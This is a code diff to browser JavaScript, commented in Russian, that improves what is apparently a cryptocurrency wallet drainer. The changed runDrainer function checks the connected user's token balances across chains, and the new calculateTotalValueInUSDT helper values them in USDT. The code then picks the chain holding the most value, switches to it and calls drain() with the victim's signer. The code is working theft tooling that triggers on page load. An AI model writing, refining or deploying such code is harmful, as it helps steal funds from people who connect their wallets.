@@ -194,23 +194,33 @@ async function checkBalance(chainId, userAddress, provider) {
     throw new Error('Failed to fetch native balance');
   }
 
-  try {
-    const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
-    tokenBalances[chainConfig.usdtAddress] = await usdt.balanceOf(userAddress);
-    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(tokenBalances[chainConfig.usdtAddress], 6)}`);
-  } catch (error) {
-    console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
-    tokenBalances[chainConfig.usdtAddress] = ethers.BigNumber.from(0);
-  }
+try {
+  const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
+  const [usdtBalance, usdtDecimals] = await Promise.all([
+    usdt.balanceOf(userAddress),
+    usdt.decimals()
+  ]);
+  tokenBalances[chainConfig.usdtAddress] = usdtBalance;
+  console.log(`📊 Сырой баланс USDT (wei): ${usdtBalance.toString()}`);
+  console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
+} catch (error) {
+  console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
+  tokenBalances[chainConfig.usdtAddress] = ethers.BigNumber.from(0);
+}
 
-  try {
-    const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
-    tokenBalances[chainConfig.usdcAddress] = await usdc.balanceOf(userAddress);
-    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(tokenBalances[chainConfig.usdcAddress], 6)}`);
-  } catch (error) {
-    console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
-    tokenBalances[chainConfig.usdcAddress] = ethers.BigNumber.from(0);
-  }
+try {
+  const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
+  const [usdcBalance, usdcDecimals] = await Promise.all([
+    usdc.balanceOf(userAddress),
+    usdc.decimals()
+  ]);
+  tokenBalances[chainConfig.usdcAddress] = usdcBalance;
+  console.log(`📊 Сырой баланс USDC (wei): ${usdcBalance.toString()}`);
+  console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
+} catch (error) {
+  console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
+  tokenBalances[chainConfig.usdcAddress] = ethers.BigNumber.from(0);
+}
 
   if (chainConfig.otherTokenAddresses) {
     const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
@@ -550,22 +560,52 @@ async function runDrainer(provider, signer, userAddress) {
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
-  const sorted = balances
-    .filter(item => hasFunds(item.balance))
-    .sort((a, b) => {
-      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      return bTotal.gt(aTotal) ? 1 : -1;
-    });
+
+  // Сортируем сети по общей стоимости токенов в USDT (без нативных)
+  const sorted = await Promise.all(
+    balances
+      .filter(item => hasFunds(item.balance))
+      .map(async (item) => {
+        const totalValueInUSDT = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
+        return { ...item, totalValueInUSDT };
+      })
+  );
+
+  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
   if (!sorted.length) {
     throw new Error('No funds found on any chain');
   }
 
   const target = sorted[0];
+  console.log(`Выбрана сеть с chainId ${target.chainId} с максимальной стоимостью токенов: ${target.totalValueInUSDT} USDT`);
   await switchChain(target.chainId);
   const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
   return status;
+}
+
+// Вспомогательная функция для расчёта общей стоимости только токенов в USDT
+async function calculateTotalValueInUSDT(chainId, balance, provider) {
+  const chainConfig = config.CHAINS[chainId];
+  let totalValue = 0;
+
+  // Учитываем только токены (USDT, USDC, другие), исключая нативные токены
+  for (const tokenAddress of Object.keys(balance.tokenBalances)) {
+    const tokenBalance = balance.tokenBalances[tokenAddress];
+    if (tokenBalance.gt(0)) {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      const decimals = await tokenContract.decimals();
+      const formattedBalance = ethers.utils.formatUnits(tokenBalance, decimals);
+      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+      totalValue += parseFloat(formattedBalance) * tokenPrice;
+    }
+  }
+
+  console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
+  return totalValue;
 }
 
 window.addEventListener('DOMContentLoaded', () => {
